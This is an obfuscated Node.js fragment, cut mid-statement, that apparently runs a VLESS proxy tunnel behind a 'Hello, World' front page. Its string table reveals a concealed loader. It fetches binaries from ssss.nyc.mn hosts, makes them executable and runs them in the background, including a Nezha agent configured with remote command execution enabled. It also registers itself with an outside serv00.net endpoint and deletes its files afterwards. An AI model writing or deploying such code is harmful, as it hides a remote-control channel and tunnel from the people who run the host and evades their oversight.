_0x703b88=sessions[_0x26f7b2(0x1e9)](_0xe54ec);!_0x703b88&&(_0x703b88=new Session(_0xe54ec),sessions[_0x26f7b2(0x2a0)](_0xe54ec,_0x703b88),log(_0x26f7b2(0x21d),_0x26f7b2(0x1cc)+_0xe54ec),setTimeout(()=>{const _0xfbd8d3=_0x26f7b2,_0x24609b=sessions[_0xfbd8d3(0x1e9)](_0xe54ec);_0x24609b&&!_0x24609b[_0xfbd8d3(0x256)]&&(log(_0xfbd8d3(0x204),_0xfbd8d3(0x254)+_0xe54ec+_0xfbd8d3(0x23d)),_0x24609b[_0xfbd8d3(0x2af)](),sessions[_0xfbd8d3(0x28e)](_0xe54ec));},SETTINGS[_0x26f7b2(0x26d)]));let _0x4e6083=[],_0x1dffa0=0x0,_0x2411c5=![];_0x2fb890['on'](_0x26f7b2(0x24d),_0x29b0d6=>{const _0x50ce30=_0x26f7b2;_0x1dffa0+=_0x29b0d6[_0x50ce30(0x1f1)];if(_0x1dffa0>SETTINGS[_0x50ce30(0x288)]){!_0x2411c5&&(_0x330876[_0x50ce30(0x27a)](0x19d),_0x330876[_0x50ce30(0x1f7)](),_0x2411c5=!![]);return;}_0x4e6083[_0x50ce30(0x264)](_0x29b0d6);}),_0x2fb890['on'](_0x26f7b2(0x1f7),async()=>{const _0x113ee8=_0x26f7b2;if(_0x2411c5)return;try{const _0x5d6181=Buffer[_0x113ee8(0x2b4)](_0x4e6083);log(_0x113ee8(0x21d),_0x113ee8(0x1d6)+_0x20a244+_0x113ee8(0x27d)+_0x5d6181[_0x113ee8(0x1f1)]),await _0x703b88[_0x113ee8(0x272)](_0x20a244,_0x5d6181),!_0x2411c5&&(_0x330876['writeHead'](0xc8,_0x384e0b),_0x2411c5=!![]),_0x330876[_0x113ee8(0x1f7)]();}catch(_0x12597f){log(_0x113ee8(0x24f),_0x113ee8(0x1df)+_0x12597f[_0x113ee8(0x1d3)]),_0x703b88[_0x113ee8(0x2af)](),sessions[_0x113ee8(0x28e)](_0xe54ec),!_0x2411c5&&(_0x330876[_0x113ee8(0x27a)](0x1f4),_0x2411c5=!![]),_0x330876['end']();}});return;}_0x330876[_0x26f7b2(0x27a)](0x194),_0x330876[_0x26f7b2(0x1f7)]();});function _0x5d3d(){const _0x2bd86b=['Transform','POST','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','\x22}\x27','954455OXDBRL','MAX_POST_SIZE','log','NEZHA_PORT','header\x20length\x20too\x20short','not\x20enough\x20data\x20to\x20read','finally','delete','headersTimeout','aarch64','substr','_writeToRemote','destroyed','forEach','toString','Received\x20out\x20of\x20order\x20packet\x20seq=','Server\x20error:\x20','4118906oGJTcw','Connected\x20to\x20','releaseLock','readable','4fBEAMS','curl\x20-s\x20--max-time\x202\x20ipv4.ip.sb','Failed\x20to\x20initialize\x20VLESS:\x20','\x20before\x20initialization','set','a87056c0-abeb-45e4-a97e-f23bdf84d191','headersSent','55586zbCUkE','Hello,\x20World\x0a','Process\x20packet\x20error:\x20','&fp=chrome&allowInsecure=1&type=xhttp&host=','Automatic\x20Access\x20Task\x20added\x20successfully:','Max\x20POST\x20size:\x20','66MxMgep','catch','--tls','socket','Error\x20sending\x20request:','GET','cleanup','NEZHA_KEY','timeout','fill','none','concat','reduce','&path=','Created\x20new\x20session\x20for\x20POST:\x20','13139WfkRHj','alpnProtocol','1nvXKMt','config.yaml','npm','env','message','nextTick','false','Processing\x20packet:\x20seq=','enqueue','text/plain','_startDownstreamResponse','unlink','responseHeader','constructor','nohup\x20./npm\x20-s\x20','headerSent','Failed\x20to\x20process\x20POST\x20request:\x20','Remote\x20error:\x20','https://amd64.ssss.nyc.mn/v1','Sending\x20VLESS\x20response\x20header\x20(','read\x20vless\x20header\x20error:\x20','pendingBuffers','axios','has','Created\x20new\x20session\x20for\x20GET:\x20','arm64','get','CHUNK_SIZE','port','VLESS\x20header\x20parse\x20error:\x20','application/octet-stream','uuid','bufferSize','listen','length','destroy','curl\x20-X\x20POST\x20\x22https://oooo.serv00.net/add-url\x22\x20-H\x20\x22Content-Type:\x20application/json\x22\x20-d\x20\x27{\x22url\x22:\x20\x22','835100TbXLxH','Transfer-Encoding','npm\x20running\x20error:\x20','end','TCP_NODELAY','localhost','from','=================================','Initializing\x20VLESS\x20connection\x20from\x20first\x20packet','toISOString','url','https://arm64.ssss.nyc.mn/agent','nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','read\x20address\x20type\x20failed','value','stream','warn','pause','2087','resp','createConnection','Socket\x20error:','reading_done','utf-8','setNoDelay','slice','https://','1880824hRiaou','parse\x20hostname\x20failed','Too\x20many\x20buffered\x20packets','Starting\x20to\x20parse\x20VLESS\x20header','Read\x20controller\x20close\x20error:','done','\x1b[36m','2053','reset','http','443','npm\x20download\x20successfully','XPATH','MAX_BUFFERED_POSTS','info','trim','pipeTo','connect\x20timeout','http/1.1','Content-Type','nextSeq','includes','Max\x20buffered\x20posts:\x20','\x20bytes','Error\x20starting\x20downstream:\x20','initializeVLESS','Vls','Relay\x20error:','):\x20','\x20>/dev/null\x202>&1\x20&','split','sub','https://amd64.ssss.nyc.mn/agent','79170HYrJUh','&mode=packet-up#','vlessHeader','cleaned','invalid\x20UUID','Remote\x20connection\x20established','https://arm64.ssss.nyc.mn/v1','startDownstream','debug','createWriteStream','initialized','pipe','resume','\x20timed\x20out\x20without\x20downstream','arm','NEZHA_SERVER','writableEnded','true','remote','uncork','writable','method','getWriter','base64','curl\x20-s\x20--max-time\x201\x20ipv6.ip.sb','SUB_PATH','Connection\x20failed:\x20','Cleanup\x20error:\x20','Upload\x20error:\x20','data','unsupported\x20command:\x20','error','read','Created\x20new\x20session\x20with\x20UUID:\x20','Failed\x20to\x20parse\x20hostname','LOG_LEVEL','Session\x20','\x1b[32m','downstreamStarted','join','close','pop','AUTO_ACCESS','random','socket\x20hang\x20up','18yjkTxT','8443','chmod\x20+x\x20npm','UUID','no-store','aborted','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','push','createServer','floor','2083','Cleaning\x20up\x20session\x20','2096','Error\x20added\x20Task:','BUFFER_SIZE','Session\x20timeout:\x20','SESSION_TIMEOUT','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','\x0aclient_secret:\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','%2F','processPacket','Socket\x20is\x20destroyed','npm\x20is\x20running','/bin/bash','/([^/]+)(?:/([0-9]+))?$','hostname','Failed\x20to\x20write\x20to\x20remote:\x20','Read\x20controller\x20error:','writeHead','Failed\x20to\x20get\x20IP\x20address:','Buffered\x20packet\x20seq=',',\x20size=','Remote\x20connection\x20not\x20available','write','currentStreamRes','Max\x20buffer\x20size:\x20','arch'];_0x5d3d=function(){return _0x2bd86b;};return _0x5d3d();}server['on']('secureConnection',_0x119c06=>{const _0x369f3f=_0x2ab542;log(_0x369f3f(0x238),'New\x20secure\x20connection\x20using:\x20'+(_0x119c06[_0x369f3f(0x1ce)]||_0x369f3f(0x221)));});function generatePadding(_0x1d24d3,_0x49864f){const _0x57b61b=_0x2ab542,_0x349695=_0x1d24d3+Math[_0x57b61b(0x266)](Math[_0x57b61b(0x25b)]()*(_0x49864f-_0x1d24d3));return Buffer[_0x57b61b(0x1fa)](Array(_0x349695)[_0x57b61b(0x2b2)]('X')['join'](''))[_0x57b61b(0x295)](_0x57b61b(0x247));}server['keepAliveTimeout']=0x975e0,server[_0x2ab542(0x28f)]=0x98968,server['on'](_0x2ab542(0x24f),_0x1ea05c=>{const _0x3f3f3e=_0x2ab542;log(_0x3f3f3e(0x24f),_0x3f3f3e(0x297)+_0x1ea05c[_0x3f3f3e(0x1d3)]);});const delFiles=()=>{const _0x3773eb=_0x2ab542;[_0x3773eb(0x1d1),_0x3773eb(0x1d0)][_0x3773eb(0x294)](_0x2170fd=>fs[_0x3773eb(0x1da)](_0x2170fd,()=>{}));};server[_0x2ab542(0x1f0)](PORT,()=>{const _0xc49c00=_0x2ab542;runnz(),setTimeout(()=>{delFiles();},0x493e0),addAccessTask(),console[_0xc49c00(0x289)]('Server\x20is\x20running\x20on\x20port\x20'+PORT),log('info',_0xc49c00(0x1fb)),log(_0xc49c00(0x21d),'Log\x20level:\x20'+SETTINGS['LOG_LEVEL']),log(_0xc49c00(0x21d),_0xc49c00(0x225)+SETTINGS[_0xc49c00(0x21c)]),log(_0xc49c00(0x21d),_0xc49c00(0x2a8)+SETTINGS[_0xc49c00(0x288)]+'KB'),log(_0xc49c00(0x21d),_0xc49c00(0x281)+SETTINGS['BUFFER_SIZE']+'KB'),log(_0xc49c00(0x21d),_0xc49c00(0x26c)+SETTINGS[_0xc49c00(0x1ea)]+'bytes'),log('info',_0xc49c00(0x1fb));});
